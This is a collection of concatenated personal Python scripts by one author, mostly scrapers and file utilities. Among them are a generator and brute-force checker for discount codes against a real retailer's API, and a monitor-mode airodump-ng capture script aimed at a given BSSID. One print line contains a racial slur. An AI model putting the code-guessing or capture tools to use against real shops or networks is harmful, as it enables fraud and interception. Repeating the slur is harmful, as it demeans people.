if __name__ == '__main__':
    corpus = analyze(open("/home/bystrousak/Plocha/corpus.txt").read())
    results = analyze(open("daemon_korektura.txt").read())

    # update statistics with data data from corpus
    for key, val in results:
        new_val = corpus.get(key, None)

        if new_val is not None:
            results[key] = new_val

    avg, median = get_avg_median(results)

    anomalies = filter_anomalies(results, 1)

    # print len(anomalies)
    # 
    for anomaly in anomalies:
        print anomaly[0], anomaly[1]

#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# cleanD v0.1.0 (22.02.2011) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import os
import os.path

#===============================================================================
#= Main program ================================================================
#===============================================================================
for f in os.listdir("."):
	if f.endswith(".d.deps") or f.endswith(".o") or (os.access(f, os.X_OK) and os.path.isfile(f) and "." not in f):
		os.unlink(f)








#! /usr/bin/env python
# -*- coding: utf-8 -*-
import time
import argparse

import psutil


def yield_processes():
    for pid in psutil.pids():
        try:
            p = psutil.Process(pid)
        except:
            continue

        try:
            yield (p.memory_percent(), p)
        except psutil._exceptions.NoSuchProcess:
            pass


def kill_process_eating_most_of_the_memory():
    processes = sorted(yield_processes())
    process = processes.pop()[-1]

    try:
        percent = process.memory_percent()
        process.terminate()
        print "killed %s (%.2f%%)" % (process.name(), percent)
    except psutil._exceptions.NoSuchProcess:
        pass


def kill_memory_eaters(percent):
    while True:
        free_memory = 100 - psutil.virtual_memory().percent
        if free_memory < percent:
            kill_process_eating_most_of_the_memory()

        yield


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-p",
        "--percent",
        default=5,
        type=int,
        help="Kill the most memory hungry process when free memory drops bellow this limit. Default %(default)s%%."
    )
    parser.add_argument(
        "-t",
        "--time",
        default=5,
        type=int,
        help="Sleep TIME seconds between checks. Default %(default)s seconds."
    )

    args = parser.parse_args()

    for _ in kill_memory_eaters(args.percent):
        time.sleep(args.time)
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
__name    = ""
__version = "0.0.1"
__date    = ".2012"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
# Notes:
    # 
#= Imports =====================================================================
import sys
import time
import json

import dhtmlparser3 as html
import CheckerTools3 as web



#= Variables ===================================================================
# URL = "http://www.amk.to/videa/nejnovejsi/detail/33213/"
URL = "http://www.amk.to/videa/nejnovejsi/detail/33213/"
web.LFFHeaders["Accept"] = "application/json, text/javascript"
web.LFFHeaders["Referer"] = "http://www.amk.to/videa/nejnovejsi/detail/33213/"
web.LFFHeaders["X-Requested-With"] = "XMLHttpRequest"



#= Functions & objects =========================================================
def write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def writeln(s, out=sys.stdout):
	write(s + "\n")
def version():
	return __name + " v" + __version + " (" + __date + ") by " + __author + " (" + __email + ")"


def transformToXml(node):
	return node



#= Main program ================================================================
if __name__ == '__main__':
	data =  web.getPage(URL + "1", headers = web.LFFHeaders)
	data += web.getPage(URL + "2", headers = web.LFFHeaders)
	data += web.getPage(URL + "3", headers = web.LFFHeaders)
	data += web.getPage(URL + "4", headers = web.LFFHeaders)

	data = data[79:-3].decode('unicode-escape', "ignore").replace("\\", "")

	dom  = html.parseString(data)

	print("<comments from='" + URL + "'>\n")

	for i in dom.find("div", {"class":"articlepost"}):
		author = i.find("span", {"class":"articlepostnadpis"})[0]
		i.childs.append(html.parseString("<author>" + author.getContent().strip() + "</author>\n"))
		author.replaceWith(html.HTMLElement(""))

		# d = i.find("span", {"class":"articlepostedit"})[0]
		# d.replaceWith(html.HTMLElement(""))

		d = i.find("div", {"class":"articleposthead"})[0]
		cid = list(filter(lambda x: "id" in x.params, d.find("span")))
		cid = cid[0].params["id"].split("-")[-1]

		date = web.removeTags(d.getContent())[2:].strip()
		timestamp = time.strftime("%s", time.strptime(date, "%d.%m.%Y %H:%M"))
		d.replaceWith(html.HTMLElement(""))
		i.childs.append(html.parseString("<timestamp>" + timestamp + "</timestamp>\n"))

		
		d = i.find("div", {"class":"articleposttext"})[0]
		content = d.find("p")[0].getContent().strip()
		d.replaceWith(html.HTMLElement(""))
		i.childs.append(html.parseString("<content>" + content + "</content>\n"))

		comment = i.find("div", {"class":"articlepost"})[0]
		comment.replaceWith(html.parseString("<comment id='" + cid + "'>\n" + comment.getContent() + "\n</comment>"))

		print(i)
		print()

	print("\n</comments>")
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = ""
__version = "0.0.1"
__date    = ".2012"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
# Notes:
    # 
#= Imports =====================================================================
import sys
import time

from mfn import web
from mfn import html



#= Variables ===================================================================
URL = "http://www.aktuality.sk/diskusia/220619/video-mlady-genius-a-sny-v-kodoch/"



#= Functions & objects =========================================================
def write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def writeln(s, out=sys.stdout):
	write(s + "\n")
def version():
	return __name + " v" + __version + " (" + __date + ") by " + __author + " (" + __email + ")"


def transformToXml(node):
	for i in node.find("span", {"class":"comment-datetime"}):
		timestamp = time.strftime("%s", time.strptime(i.getContent(), "%d.%m.%Y | %H:%M"))
		i.replaceWith(html.parseString("<timestamp>" + timestamp + "</timestamp>\n"))
	for i in node.find("span"):
		i.replaceWith(html.HTMLElement(""))

	for i in node.find("li", {"class":"reply-space"}):
		i.replaceWith(html.HTMLElement(""))
	for i in node.find("img"):
		i.replaceWith(html.HTMLElement(""))

	for i in node.find("div", {"class":"head with-reactions"}) + node.find("div", {"class":"head"}):
		username = i.find("a", {"onmouseout":"javascript:hideUserBox();"})[0].getContent()
		i.replaceWith(html.HTMLElement("<username>" + username.strip() + "</username>\n" + str(i.find("timestamp")[0]) + "\n"))

	for i in node.find("div", {"class":"message"}):
		content = i.find("p")[0].getContent().strip()
		i.replaceWith(html.HTMLElement("<content>" + content + "</content>\n"))

	for i in node.find("div", {"class":"message with-reactions"}):
		content = i.find("p")[0].getContent().strip()
		i.replaceWith(html.HTMLElement("<content>" + content + "</content>\n"))

	for i in node.find("ul", {"class":"second-level"}):
		i.replaceWith(html.HTMLElement("<replies>\n" + i.getContent() + "\n</replies>\n"))

	for i in node.find("li"):
		cid = i.params["id"].split("_")[-1]
		i.replaceWith(html.HTMLElement("<comment id = " + cid + ">\n" + i.getContent() + "\n</comment>\n"))

	node = html.parseString(str(node.prettify()))

	for i in node.find("li"):
		cid = i.params["id"].split("_")[-1]
		i.replaceWith(html.HTMLElement("<comment id = " + cid + ">\n" + i.getContent() + "\n</comment>\n"))

	for i in node.find("replies"):
		el = html.HTMLElement("")
		el.childs = i.childs
		i.replaceWith(el)

	node = html.parseString(str(node))
	return node



#= Main program ================================================================
if __name__ == '__main__':
	data = web.getPage(URL)
	dom  = html.parseString(data)

	dom = dom.find("div", {"class":"discussion"})[0]

	out = ""
	for li in dom.find("ul")[0].childs:
		if li.getTagName() != "li":
			continue

		out += str(transformToXml(li))

	dom  = html.parseString(out)
	for i in dom.find("ul"):
		i.replaceWith(html.HTMLElement(""))

	envelope = html.parseString("<comments from='" + URL + "'></comments>")

	envelope.find("comments")[0].childs = dom.childs

	print envelope
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = ""
__version = "0.0.1"
__date    = ".2012"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
# Notes:
    # 
#= Imports =====================================================================
import sys
import time
import json

import dhtmlparser as html



#= Variables ===================================================================
# URL = "http://www.amk.to/videa/nejnovejsi/detail/33213/"
URL = "http://www.amk.to/videa/nejnovejsi/detail/33213/"



#= Functions & objects =========================================================
def write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def writeln(s, out=sys.stdout):
	write(s + "\n")
def version():
	return __name + " v" + __version + " (" + __date + ") by " + __author + " (" + __email + ")"


def transformToXml(node):
	return node



#= Main program ================================================================
if __name__ == '__main__':
	data = open("amk.to.xml").read()
	dom = html.parseString(data)

	for i in dom.find("div", {"class":"articlepost"}):
		print i#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = ""
__version = "0.0.1"
__date    = ".2012"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
# Notes:
    # 
#= Imports =====================================================================
import sys
import time

from mfn import web
from mfn import html



#= Variables ===================================================================
URL = "http://www.rouming.cz/roumingVideo.php?id=27330"



#= Functions & objects =========================================================
def write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def writeln(s, out=sys.stdout):
	write(s + "\n")
def version():
	return __name + " v" + __version + " (" + __date + ") by " + __author + " (" + __email + ")"


def transformToXml(node):
	return node



#= Main program ================================================================
if __name__ == '__main__':
	data = web.getPage(URL)
	dom  = html.parseString(data)

	dom = dom.find("table", {"width":"780"})[0]

	print "<comments from='" + URL + "'>"

	for i in zip(dom.find("td", {"class":"roumingForumTitle"}), dom.find("td", {"class":"roumingForumMessage"})):
		link = i[0].find("a")[0].params["href"]
		i[0].find("a")[0].replaceWith(html.HTMLElement(""))

		print "	<comment id='" + link.split("=")[-1] + "'>"
		print "		<link>" + link + "</link>"

		date = i[0].find("font", {"size":"-1"})[0].getContent()
		i[0].find("font", {"size":"-1"})[0].replaceWith(html.HTMLElement(""))
		date = date[1:-1].replace(" ", ".").replace(":", ".").split(".")
		date = ".".join(map(lambda x: "0" + x if len(x) == 1 else x, date))
		date = time.strftime("%s", time.strptime(date, "%d.%m.%Y.%H.%M"))
		print "		<timestamp>" + date + "</timestamp>"


		strong = i[0].find("strong")
		if len(strong) >= 1:
			strong[0].replaceWith(html.HTMLElement(""))

		name = ""
		a = i[0].find("a")
		if len(a) >= 1:
			name = a[0].getContent()
			a[0].replaceWith(html.HTMLElement(""))
		else:
			name = i[0].getContent().strip()[1:-1]
		print "		<name>" + name + "</name>"

		for img in i[1].find("img"):
			img.replaceWith(html.HTMLElement(img.params["alt"]))

		content = i[1].getContent().replace("\n", " ").strip()
		print "		<content>" + content + "</content>"
		print "	</comment>"

	print "</comments>"
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = ""
__version = "0.0.1"
__date    = ".2012"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
# Notes:
    # 
class Comment:
	def __init__(self, author, text, link, content):
		self.author  = author
		self.text    = text
		self.link    = link
		self.content = content

		self.reactions = []

	def __str__(self, depth = 0):
		out = ""
		for r in reactions:
			out += r.__str__(self.depth + 1)

		return str(
			(self.depth * "\t") + "Author: " + self.author + "\n" + 
			(self.depth * "\t") + "Text: " + self.text + "\n" + 
			(self.depth * "\t") + "Link: " + self.link + "\n" + 
			(self.depth * "\t") + "Content:\n" + self.content + "\n\n"
		) + out#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = ""
__version = "0.0.1"
__date    = ".2012"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
# Notes:
    # 
#= Imports =====================================================================
import sys
import time

from mfn import web
from mfn import html



#= Variables ===================================================================
URL = "http://www.ac24.cz/zpravy-ze-sveta/1501-video-mlady-genius-a-sny-v-kodech"



#= Functions & objects =========================================================
def write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def writeln(s, out=sys.stdout):
	write(s + "\n")
def version():
	return __name + " v" + __version + " (" + __date + ") by " + __author + " (" + __email + ")"


def transformToXml(node):
	return node



#= Main program ================================================================
if __name__ == '__main__':
	# data = web.getPage(URL)
	data = open("asd.html").read()
	dom  = html.parseString(data)

	# dom = dom.find("div", {"id":"comments"})[0]

	print "<comments from='" + URL + "'>"

	for i in dom.find("div", {"class":"comment-box usertype-registered"}) + dom.find("div", {"class":"comment-box usertype-guest"}):
		author = i.find("span", {"class":"comment-author"})[0]
		author.replaceWith(html.parseString("<author>" + author.getContent() + "</author>"))

		for img in i.find("img"):
			img.replaceWith(html.HTMLElement(img.params["alt"]))

		content = i.find("div", {"class":"comment-body"})[0]
		content.replaceWith(html.parseString("<content>" + content.getContent() + "</content>"))

		link = i.find("a", {"class":"comment-anchor"})[0]
		cid = link.params["href"].split("-")[-1]
		link.replaceWith(html.parseString("<link>http://www.ac24.cz" + link.params["href"] + "</link>"))

		d = i.find("span", {"class":"comments-vote"})[0]
		d.replaceWith(html.HTMLElement(""))
		d = i.find("span", {"class":"comments-buttons"})[0]
		d.replaceWith(html.HTMLElement(""))

		date = i.find("span", {"class":"comment-date"})[0]
		timestamp = time.strftime("%s", time.strptime(date.getContent(), "%Y-%m-%d %H:%M"))
		date.replaceWith(html.parseString("<timestamp>" + timestamp + "</timestamp>"))

		comment = i.find("div")[0]
		comment.replaceWith(html.parseString("<comment id='" + cid + "'>\n" + comment.getContent() + "\n</comment>"))

		print i
		print

	print "</comments>"
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import os
import dhtmlparser as d


PATH = "patrik_syn_irska/OEBPS/Text"


def get_files():
    for fn in os.listdir(PATH):
        if not fn.endswith(".xhtml"):
            continue

        yield fn


if __name__ == '__main__':
    for fn in get_files():
        with open(os.path.join(PATH, fn)) as f:
            dom = d.parseString(f.read())
            d.makeDoubleLinked(dom)

        images = dom.find("img")
        if not images:
            continue

        image = images[0]
        if not image.parent:
            continue

        if image.parent.getTagName() == "div" and \
           image.parent.params.get("class", "").startswith("g"):
            if "alt" in image.params:
                del image.params["alt"]
            if "class" in image.params:
                del image.params["class"]

            image.parent.endtag.replaceWith(d.parseString(""))
            image.parent.replaceWith(image)

            with open("out/%s" % fn, "w") as f:
                f.write(dom.__str__())
#! /usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Interpreter version: python 3
#
"""
Tento script stojí na mé zkušenosti s 5% slevovým kódem na alzu FRYDEK5. Z toho
jsem vyvodil hypotézu, že by mohlo existovat více slevových kódů nazvaných
podle měst v Čechách.
"""
#
# Imports =====================================================================
import os.path
import unicodedata


# Functions & classes =========================================================
def read_cities():
    fn = os.path.join(os.path.dirname(__file__), "mesta.txt")
    with open(fn) as f:
        return [x for x in f.read().splitlines() if x]


def normalize(line):
    line = line.upper()
    line = unicodedata.normalize('NFKD', line)

    return "".join(c for c in line if not unicodedata.combining(c))


def tokenize(city):
    city = city.replace("-", " ")

    return city.split()


def permutate(city_tokens):
    def number_adder(tok):
        yield tok
        yield tok + "5"
        yield tok + "10"

    if len(city_tokens) == 1:
        yield from number_adder(city_tokens[0])
        return

    yield from number_adder("".join(city_tokens))

    for token in city_tokens:
        yield from number_adder(token)


def all_permutations():
    for city in read_cities():
        for per in permutate(tokenize(normalize(city))):
            yield per


# Main program ================================================================
if __name__ == '__main__':
    for code in all_permutations():
        print(code)
#! /usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Interpreter version: python 3
#
# Imports =====================================================================
import re


# Functions & classes =========================================================
def read_data():
    with open("raw_data.txt") as f:
        return f.read()


def pick_examples(raw_data):
    return [
        x
        for x in re.findall(r"[\dA-Z]{10}", raw_data)
        if not x.isdigit()
    ]


# Main program ================================================================
if __name__ == '__main__':
    examples = "\n".join(pick_examples(read_data()))
    print(examples)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys
import json
import copy
import os.path
import argparse

from tqdm import tqdm
import requests
if hasattr(requests, "packages"):
    requests.packages.urllib3.disable_warnings()


# Variables ===================================================================
VALID_FN = "valid_codes.txt"
INVALID_FN = "invalid_codes.txt"


# Functions & classes =========================================================
def is_valid(code):
    req = requests.post(
        "https://www.alza.cz/Services/EShopService.svc/InsertDiscountCode",
        data=json.dumps({"code": code, "confirm": False}),
        headers={
            'Content-Type': 'application/json',
            "User-Agent": (
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) "
                "Gecko/20100101 Firefox/44.0"
            ),
        },
    )

    data = req.json()
    msg = data.get("d", {}).get("Message", "")

    is_used = u"byl již použit" in msg
    is_invalid = u"není platný" in msg
    items_count = data.get("d", {}).get("ItemsCount", 0)

    return not (is_invalid or is_used) or items_count > 0


def save_valid(code):
    with open(VALID_FN, "a") as f:
        f.write(code + "\n")


def save_invalid(invalid_code):
    with open(INVALID_FN, "a") as f:
        f.write(invalid_code + "\n")


def load_invalids():
    """
    This is kinda important, because connections hangs / timeouts from time to
    time and this will keep the progress.
    """
    if not os.path.exists(INVALID_FN):
        return set()

    with open(INVALID_FN) as f:
        return set(f.read().splitlines())


def process_codes(codes, invalids):
    invalids = copy.copy(invalids)
    valid_codes = []

    for code in codes:
        code = code.strip()

        if not code:
            continue

        if code in invalids:
            continue

        if is_valid(code):
            valid_codes.append(code)
            if args.save:
                save_valid(code)
        else:
            invalids.add(code)
            if args.save:
                save_invalid(code)

    return valid_codes, invalids


# Main program ================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="Test alza gift / discount code."
    )
    parser.add_argument(
        "CODES",
        nargs="*",
        help="List of codes. Use - to read codes from stdin."
    )
    parser.add_argument(
        "-s",
        "--save",
        action="store_true",
        help="Save progress."
    )
    parser.add_argument(
        "-q",
        "--quiet",
        action="store_true",
        help="Don't use progressbar."
    )

    args = parser.parse_args()

    # prepare dataset
    dataset = args.CODES if args.CODES else sys.stdin
    dataset = dataset if args.quiet else tqdm(dataset)

    invalids = load_invalids() if args.save else set()

    valid_codes, invalids = process_codes(dataset, invalids)

    if not valid_codes:
        print("Sorry, no valid codes found.")
        sys.exit(1)

    if not args.quiet:
        print("Valid codes:")

    sep = "\t" if not args.quiet else ""

    print(sep + ("\n" + sep).join(valid_codes))

    if args.save and not args.quiet:
        print("\nSee also `valid_codes.txt`")
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import httpkie
import dhtmlparser


# Variables ===================================================================



# Functions & classes =========================================================
def get_death_table(url):
    if "&action=edit" not in url:
        url += "&action=edit"

    downer = httpkie.Downloader()
    data = downer.download(url)
    dom = dhtmlparser.parseString(data)

    return dom.find("textarea")[0].getContent()


def parse_death_table(source):
    source = source.splitlines()

    casulties = filter(lambda x: '|align="right"|' in x, source)

    return map(
        lambda x: x.split("|")[-1],
        casulties[::2]
    )


def count_deaths(death_list):
    clean = map(
        lambda x: x.strip().replace("+", "").split("~")[0].split(" ")[0].replace(">", ""),
        death_list
    )

    clean = filter(
        lambda x: all(map(lambda y: y.isdigit(), x)) and x,
        clean
    )
    print clean


    return sum(
        map(
            lambda x: int(x),
            clean
        )
    )


# Main program ================================================================
if __name__ == '__main__':
    dt = get_death_table(
        "http://en.wikipedia.org/w/index.php?title=List_of_terrorist_incidents,_2010"
    )

    print count_deaths(
        parse_death_table(dt)
    )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
from collections import defaultdict

import abclinuxuapi


blog = abclinuxuapi.Blogpost(
    "http://www.abclinuxu.cz/blog/bystroushaak/2017/5/co-povazujete-za-nejdulezitejsi",
    lazy=False
)

commenters = {c.username for c in blog.comments}

print "Pocet komentaru: %d" % len(blog.comments)
print "Pocet komentatoru: %d" % len(commenters)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import sys
import shutil
import os.path


# Variables ===================================================================



# Functions & objects =========================================================
def _parse_version(ver):
    ver = ver.strip()

    try:
        return float(ver.replace("0.", ""))
    except ValueError:
        version = ver.split("-")[0].replace("0.", "")

        try:
            version = float(version)
        except ValueError:
            version = ver.split("0.")[-1]

    return float(version)


def parse_name(fn):
    tokens = fn.split(" - ")
    version_tokens = tokens[-1].split(".mov")

    series_name = tokens[0]

    if " " in version_tokens[0]:
        topic, version = version_tokens[0].rsplit(" ", 1)
    else:
        version = version_tokens[0]
        topic = ""
        print
        print "token", version_tokens[0]

    return series_name, topic.strip(), str(_parse_version(version))


def get_suffix(fn):
    return fn.rsplit(".", 1)[-1]


# Main program ================================================================
if __name__ == '__main__':
    if "-r" not in sys.argv:
        print "Dry run. Use -r for real rename."
        print

    for fn in os.listdir("."):
        if not os.path.isfile(fn):
            continue

        if fn in sys.argv[0]:
            continue

        series, topic, version = parse_name(fn)
        new_name = version + "; " + topic + "." + get_suffix(fn)

        if "-r" in sys.argv:
            shutil.move(fn, new_name)

        print new_nameimport os
import os.path

actual_folder = os.path.basename(os.path.abspath("../"))

print actual_folder

inis = os.listdir(".")

inis = filter(lambda x: ".ini" in x, inis)

for i in inis:
    file = open(i)
    data = file.read().splitlines()
    file.close()

    odata = ""
    for d in data:
        if "Path" in d:
            td = d.split("=")
            if os.path.exists(d):
                odata += d + "\n"
            else:

                tlst = os.listdir("../../" + os.path.dirname(td[1]).strip())
                tlst = filter(lambda x: x.lower() in td[1].lower(), tlst)
                if len(tlst) != 0:
                    odata += td[0] + " = " + os.path.dirname(td[1]).strip() + "/" + tlst[0] + "\n"
                else:
                    odata += d + "\n"
        else:
            odata += d + "\n"

    file = open(i, "w")
    data = file.write(odata)
    file.close()


#! /usr/bin/env python
# -*- coding: utf-8 -*-
import os
import sys
import hashlib
import os.path
import tarfile
import argparse


EBOOK_EXTENSIONS = {
    "epub",
    "pdf",
    "mobi",
    "cbr",
    "cbz",
    "djvu",
    "chm",
    "doc",
    "fb2",
}


def yield_ebook_paths(dir_name):
    for root, dirs, files in os.walk(dir_name):
        for fn in files:
            path = os.path.join(root, fn)

            extension = path.split(".")[-1].lower()
            if extension in EBOOK_EXTENSIONS:
                yield path


def compute_hash(path):
    with open(path) as f:
        return hashlib.md5(f.read()).hexdigest()


def handle_hashdb(hash_db_path, ebook_dir_path):
    hashes = set()
    if os.path.exists(hash_db_path):
        with open(hash_db_path) as f:
            hashes = set(f.read().splitlines())

    try:
        for ebook_path in yield_ebook_paths(ebook_dir_path):
            ebook_hash = compute_hash(ebook_path)
            if ebook_hash not in hashes:
                hashes.add(ebook_hash)
                yield ebook_path


    finally:
        if hashes:
            with open(hash_db_path, "w") as f:
                f.write("\n".join(hashes))


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "ebook_path",
        metavar="PATH",
        help="Path to the dirextory with ebooks."
    )
    hash_db_default_fn = "hash_db.txt"
    parser.add_argument(
        "-d",
        "--hash-db",
        default=hash_db_default_fn,
        help="Name of the hash storage. Default `%s`." % hash_db_default_fn
    )
    parser.add_argument(
        "-o",
        "--out",
        required=True,
        metavar="TAR_FILE",
        help="Name of the output tar file, where the ebooks will be stored."
    )
    args = parser.parse_args()

    if not os.path.exists(args.ebook_path):
        sys.stderr.write("`%s` doesn't exsists!\n" % args.ebook_path)
        sys.exit(1)

    if not os.path.isdir(args.ebook_path):
        sys.stderr.write("`%s` must be a directory!\n" % args.ebook_path)
        sys.exit(1)

    with tarfile.open(args.out, "a") as tar:
        for ebook_path in handle_hashdb(args.hash_db, args.ebook_path):
            print "adding", ebook_path
            tar.add(ebook_path)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
import os
import time
import random

hands = [
    "\\o/",
    "\\o<",
    "\\o>",
    "<o>",
    ">o>",
    "_o>",
    "_o_",
    "<o_",
    "\\o_",
    "_o/",
    "<o/",
    "\\o>",
]
body = " | "
legs = [
    "/^\\",
    "/^\\",
    "/^\\",
    "/^\\",
    "/^\\",
    "-^\\",
    "-^\\",
    "/^-",
    "/^)",
    "(^)",
    "(^\\",
]


while True:
    os.system("clear")
    print random.choice(hands)
    print body
    print random.choice(legs)
    time.sleep(0.1)#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Geany text editor.
#
# Notes:
    # http://mirror.informatik.uni-mannheim.de/pub/ccc
#= Imports =====================================================================
import CheckerTools as c
import dhtmlparser as d
import sys

#= Variables ===================================================================



#= Functions & objects =========================================================



#= Main program ================================================================
if len(sys.argv) == 1:
	print "Please, nigga.."
	sys.exit(1)

for i in sys.argv[1:]:
	for l in d.parseString(c.getPage(i)).find("a"):
		href = l.params["href"]
		if "-en-" in href and not href.endswith("md5") and not href.endswith("torrent") and not href.endswith("sha1"):
			i += not i.endswith("/") and "/" or ""
			print i + l.params["href"]








#! /usr/bin/env python2
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import os
import os.path
import shutil

from PIL import Image


def _get_images():
    for fn in sorted(os.listdir(".")):
        if not fn.endswith(".png"):
            continue

        yield Image.open(fn)



if __name__ == '__main__':
    if os.path.exists("out"):
        shutil.rmtree("out")

    os.mkdir("out")

    filenames = []
    for img in _get_images():
        x_offset = 237
        Y_offset = 25

        width = 680
        height = 356
        if img.filename == "Snímek obrazovky pořízený 17. 09. 2017, 18:29:17.png":
            height = 754

        cropped = img.crop((x_offset, Y_offset, width, height))

        new_fn = os.path.join("out", img.filename)
        cropped.save(new_fn)

        filenames.append(img.filename)

    # os.system("xdg-open 'out/Snímek obrazovky pořízený 17. 09. 2017, 18:26:41.png'")

    with open("out/tiled.html", "w") as f:
        images = "<br />\n".join(("<img src='%s' />" % x) for x in filenames)
        f.write("""<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
<body>
%s
</body>
</html>
""" % images)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v1.0.0 (03.04.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/cz/).
# Created in Geany text editor.
#
# Notes:
    # 
import os
import sys
import argparse
import commands

def setMode(interface, mode, channel = -1):
	chan_str = ""
	if channel != -1:
		chan_str = " freq " + str(channel)
	
	interface = str(interface)
	os.system("ifconfig " + interface + " down")
	os.system("iwconfig " + interface + " mode " + str(mode) + chan_str)
	os.system("ifconfig " + interface + " up")


# parse args
parser = argparse.ArgumentParser()
parser.add_argument("interface", metavar="IFACE", action="store", type=str, help = "Interface")
parser.add_argument("-b", "--bssid", metavar="MAC", action="store", type=str, help = "BSSID - accesspoint MAC address")
parser.add_argument("-c", "--channel", metavar="CHAN", action="store", type=int, help = "Channel")
parser.add_argument("-m", type=bool, help = "Leave interface in monitor mode")
args = parser.parse_args()
if args.bssid == None or args.channel == None or args.interface == None:
	print "You have to specify interface, channel and BSSID!"
	sys.exit()



print "Setting interface to monitor mode"

os.system("service network-manager stop")
os.system("service wicd stop")

# channel can be switched only in managed mode :S
setMode(args.interface, "managed")
os.system("ifconfig " + args.interface + " up")
os.system("iwconfig " + args.interface + " freq " + str(args.channel))

setMode(args.interface, "monitor", args.channel)

# test monitor mode
mode = filter(lambda x: "Mode:" in x, commands.getoutput("iwconfig " + args.interface).splitlines())[0]
mode = filter(lambda x: "Mode" in x, mode.split())[0].split(":")[1]
if mode.lower() != "monitor":
	print "Can't turn interface", args.interface, "to monitor mode!"
	sys.exit(1)

# save data for dec.sh
os.system("echo '" + args.bssid + "' > bssid.dat")

# sniff with airodump-ng
os.system("airodump-ng -c " + str(args.channel) + " --bssid " + args.bssid + " --output-format pcap -w ofile " + args.interface)

# set back to managed
print "Setting interface back to normal"
setMode(args.interface, "managed")
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/cz/).
# Created in Geany text editor.
#
# Notes:
    # 
import os
import os.path

for f in os.listdir("."):
	if (os.path.isdir(f)):
		os.system("cd '" + f + "'; tar -cvf '../" + f + ".cbt' *.jpg")









import CheckerTools as c
import time

def getD():
	return c.getPage("here goes url")


d1 = ""
cnt = 0
tcnt = 0
while True:
	tcnt += 1
	d2 = getD()
	time.sleep(60)

	if d1 != d2:
		print str(time.time()) + " Saving.."
		f = open("dump" + str(cnt) + ".html", "w")
		f.write(d2)
		f.close()
		cnt += 1
		d1 = d2

	if tcnt >= 180:
		break

#! /usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Interpreter version: python 3
#
# Imports =====================================================================
